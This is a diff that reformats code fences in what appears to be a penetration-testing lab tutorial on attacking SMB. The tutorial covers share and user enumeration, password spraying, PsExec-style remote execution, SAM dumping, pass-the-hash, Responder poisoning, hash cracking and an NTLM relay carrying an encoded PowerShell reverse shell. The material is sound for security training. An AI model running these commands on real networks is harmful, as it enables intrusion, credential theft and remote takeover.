@@ -18,8 +18,7 @@ To attack an SMB Server, we need to understand its implementation, operating sys
 
 Depending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let's scan ports 139 and 445 TCP.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
@@ -63,8 +62,7 @@ If we find an SMB server that does not require a username and password or find v
 
 Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbclient -N -L //10.129.14.128
 
         Sharename       Type      Comment
@@ -78,8 +76,7 @@ SMB1 disabled no workgroup available
 
 `Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -H 10.129.14.128
 
 [+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
@@ -93,8 +90,7 @@ hiimeins@htb[/htb]$ smbmap -H 10.129.14.128
 
 Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
 
 [+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
@@ -114,16 +110,14 @@ hiimeins@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
 
 From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
 
 [+] Starting download: notes\note.txt (116 bytes)
 [+] File output to: /htb/10.129.14.128-notes_note.txt
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
 
 [+] Starting upload: test.txt (20 bytes)
@@ -136,8 +130,7 @@ We can use the `rpcclient` tool with a null session to enumerate a workstation o
 
 The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ rpcclient -U'%' 10.10.110.17
 
 rpcclient $> enumdomusers
@@ -160,8 +153,7 @@ user:[smorgan] rid:[0xa37]
 
 The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
 
 ENUM4LINUX - next generation
@@ -217,8 +209,7 @@ Password spraying is a better alternative since we can target a list of username
 
 With CrackMapExec (CME), we can target multiple IPs, using numerous users and passwords. Let's explore an everyday use case for password spraying. To perform a password spray against one IP, we can use the option `-u` to specify a file with a user list and `-p` to specify a password. This will attempt to authenticate every user from the list using the provided password.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /tmp/userlist.txt
 
 Administrator
@@ -228,8 +219,7 @@ admin
 jurena
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
@@ -283,8 +273,7 @@ We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us
 
 To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-psexec -h
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -331,8 +320,7 @@ connection:
 
 To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -359,8 +347,7 @@ The same options apply to `impacket-smbexec` and `impacket-atexec`.
 
 Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
@@ -375,8 +362,7 @@ SMB         10.10.110.17 445    WIN7BOX  nt authority\system
 
 Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
@@ -398,8 +384,7 @@ The Security Account Manager (SAM) is a database file that stores users' passwor
 - Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
 - Pass The Hash. We will discuss it later in this section.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
@@ -418,8 +403,7 @@ SMB         10.10.110.17 445    WIN7BOX  [+] Added 6 SAM hashes to the database
 
 If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
 
 SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
@@ -434,8 +418,7 @@ The most common tool to perform such operations is the `Responder`. [Responder](
 
 Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ responder -I <interface name>
 ```
 
@@ -449,8 +432,7 @@ When a user or a system tries to perform a Name Resolution (NR), a series of pro
 
 Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo responder -I ens33
 
                                          __               
@@ -529,8 +511,7 @@ All saved Hashes are located in Responder's logs directory (`/usr/share/responde
 
 **Note:** If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
@@ -569,8 +550,7 @@ The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the 
 
 First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
 
 SMB = Off
@@ -578,8 +558,7 @@ SMB = Off
 
 Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -614,15 +593,13 @@ test:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
 
 We can create a PowerShell reverse shell using <https://www.revshells.com/>, set our machine IP address, port, and the option Powershell #3 (Base64).
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
 ```
 
 Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 9001
 
 listening on [any] 9001 ...
